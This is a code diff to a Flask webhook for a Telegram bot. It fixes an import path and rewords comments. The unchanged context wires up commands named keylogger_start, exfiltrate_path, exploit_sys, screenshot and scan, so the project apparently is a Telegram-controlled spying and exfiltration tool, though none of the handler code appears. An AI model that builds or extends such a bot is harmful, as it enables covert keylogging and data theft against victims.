@@ -4,8 +4,10 @@ from flask import Blueprint, request, abort
 from telegram import Update
 from telegram.ext import ApplicationBuilder, CommandHandler
 
-# ✅ Import corrigé depuis ton propre projet
-from telegram_bot.utils import get_api_keys
+# ✅ Import corrigé : utils.py est maintenant dans models/
+from models.utils import get_api_keys
+
+# ✅ Import stable des handlers
 from telegram_bot.telegram_bot import (
     menu, osint, scan, exploit_sys,
     screenshot, keylogger_start,
@@ -44,7 +46,7 @@ def handle_webhook():
         app.add_handler(CommandHandler("exfiltrate_path", exfiltrate_path))
         app.add_handler(CommandHandler("rapport", rapport))
 
-        # ⚙️ Mise à jour
+        # ⚙️ Traitement de la mise à jour Telegram
         app.update_queue.put_nowait(update)
 
         return {"status": "ok"}
